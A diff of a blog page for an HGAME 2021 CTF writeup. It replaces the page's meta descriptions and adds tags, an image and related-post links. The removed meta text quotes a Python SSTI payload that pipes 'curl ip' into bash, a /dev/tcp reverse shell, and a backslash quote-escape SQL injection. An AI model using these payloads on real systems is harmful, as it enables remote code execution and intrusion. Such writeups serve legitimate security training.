@@ -1,62 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Level - Week3 Forgetful 考点：简单python-SSTI
-题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：
-最为常规的payload：
-{{[].__class__.__mro__[1].__subclasses__()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()}}因为命令执行处有waf，所以可以选择直接弹shell：
-nc -lvnp 8888bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1姿势还是比较常规；
-分享一个从[].__class__.__mro__[1].__subclasses__()查找模块位置的脚本：
-#python 3 import re str = &amp;#39;&amp;#39;&amp;#39; [回显内容] &amp;#39;&amp;#39;&amp;#39; list = re.split(&amp;#39;,&amp;#39;, str) for i in range(0, len(list)): if &amp;#39;catch_warnings&amp;#39; in list[i]: print(i) break iki-Jail 考点：MySQL注入，单引号逃逸
-熟悉的登录框，熟悉的sql注入
-发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。
-于是直接使用bp对login.php发包；
-进行了简单的fuzz，过滤如下：
-由单双引号过滤想到了\逃逸单引号，当我们用户名输入admin\的时候，语句变成了：
-SELECT * FROM user WHERE username=&amp;#39;admin\&amp;#39; AND password=&amp;#39;xxx&amp;#39; 那么xxx就变成了sql语句执行，造成了注入；
-结果发现只能延时注入：
-exp：
-#python3,wh1sper import requests import time host = &amp;#39;https://jailbreak.'><title>HGAME 2021 Writeup</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Vidar team主办的比赛'><title>HGAME 2021 Writeup</title>
 
 <link rel='canonical' href='https://anthem-whisper.github.io/p/hgame-2021-writeup/'>
 
 <link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='HGAME 2021 Writeup'>
-<meta property='og:description' content='Level - Week3 Forgetful 考点：简单python-SSTI
-题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：
-最为常规的payload：
-{{[].__class__.__mro__[1].__subclasses__()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()}}因为命令执行处有waf，所以可以选择直接弹shell：
-nc -lvnp 8888bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1姿势还是比较常规；
-分享一个从[].__class__.__mro__[1].__subclasses__()查找模块位置的脚本：
-#python 3 import re str = &amp;#39;&amp;#39;&amp;#39; [回显内容] &amp;#39;&amp;#39;&amp;#39; list = re.split(&amp;#39;,&amp;#39;, str) for i in range(0, len(list)): if &amp;#39;catch_warnings&amp;#39; in list[i]: print(i) break iki-Jail 考点：MySQL注入，单引号逃逸
-熟悉的登录框，熟悉的sql注入
-发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。
-于是直接使用bp对login.php发包；
-进行了简单的fuzz，过滤如下：
-由单双引号过滤想到了\逃逸单引号，当我们用户名输入admin\的时候，语句变成了：
-SELECT * FROM user WHERE username=&amp;#39;admin\&amp;#39; AND password=&amp;#39;xxx&amp;#39; 那么xxx就变成了sql语句执行，造成了注入；
-结果发现只能延时注入：
-exp：
-#python3,wh1sper import requests import time host = &amp;#39;https://jailbreak.'>
+<meta property='og:description' content='Vidar team主办的比赛'>
 <meta property='og:url' content='https://anthem-whisper.github.io/p/hgame-2021-writeup/'>
 <meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='XSS' /><meta property='article:tag' content='SQLi' /><meta property='article:published_time' content='2021-02-20T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-02-20T00:00:00&#43;00:00'/><meta property='og:image' content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png' />
 <meta name="twitter:title" content="HGAME 2021 Writeup">
-<meta name="twitter:description" content="Level - Week3 Forgetful 考点：简单python-SSTI
-题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：
-最为常规的payload：
-{{[].__class__.__mro__[1].__subclasses__()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()}}因为命令执行处有waf，所以可以选择直接弹shell：
-nc -lvnp 8888bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1姿势还是比较常规；
-分享一个从[].__class__.__mro__[1].__subclasses__()查找模块位置的脚本：
-#python 3 import re str = &amp;#39;&amp;#39;&amp;#39; [回显内容] &amp;#39;&amp;#39;&amp;#39; list = re.split(&amp;#39;,&amp;#39;, str) for i in range(0, len(list)): if &amp;#39;catch_warnings&amp;#39; in list[i]: print(i) break iki-Jail 考点：MySQL注入，单引号逃逸
-熟悉的登录框，熟悉的sql注入
-发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。
-于是直接使用bp对login.php发包；
-进行了简单的fuzz，过滤如下：
-由单双引号过滤想到了\逃逸单引号，当我们用户名输入admin\的时候，语句变成了：
-SELECT * FROM user WHERE username=&amp;#39;admin\&amp;#39; AND password=&amp;#39;xxx&amp;#39; 那么xxx就变成了sql语句执行，造成了注入；
-结果发现只能延时注入：
-exp：
-#python3,wh1sper import requests import time host = &amp;#39;https://jailbreak.">
+<meta name="twitter:description" content="Vidar team主办的比赛"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png' />
     </head>
     <body class="">
     <script>
@@ -226,17 +182,47 @@ exp：
         </a>
     </div>
 
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hgame-2021-writeup/">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png" loading="lazy" alt="Featured image of post HGAME 2021 Writeup" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
+                CTF writeup
+            </a>
+        
+    </header>
     
 
     <h2 class="article-title">
         <a href="/p/hgame-2021-writeup/">HGAME 2021 Writeup</a>
     </h2>
 
-    </div>
+    
+    <h3 class="article-subtitle">
+        Vidar team主办的比赛
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Feb 20, 2021</time>
+    </footer></div>
 </header>
 
     <section class="article-content">
@@ -507,6 +493,14 @@ bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1
 
     <footer class="article-footer">
     
+    <section class="article-tags">
+        
+            <a href="/tags/xss/">XSS</a>
+        
+            <a href="/tags/sqli/">SQLi</a>
+        
+    </section>
+
 
     
     <section class="article-copyright">
@@ -527,6 +521,79 @@ bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1
 
     <aside class="related-contents--wrapper">
     
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">纵横杯 Writeup by X1cT34m</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/roarctf-2020/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RoarCTF 2020</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/n1ctf2020/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">N1CTF2020</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/dozerctf2020_web/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DozerCTF2020_web</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/whuctf2020/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170745.jpeg" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170745.jpeg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">WHUCTF2020</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
     
 </aside>
 
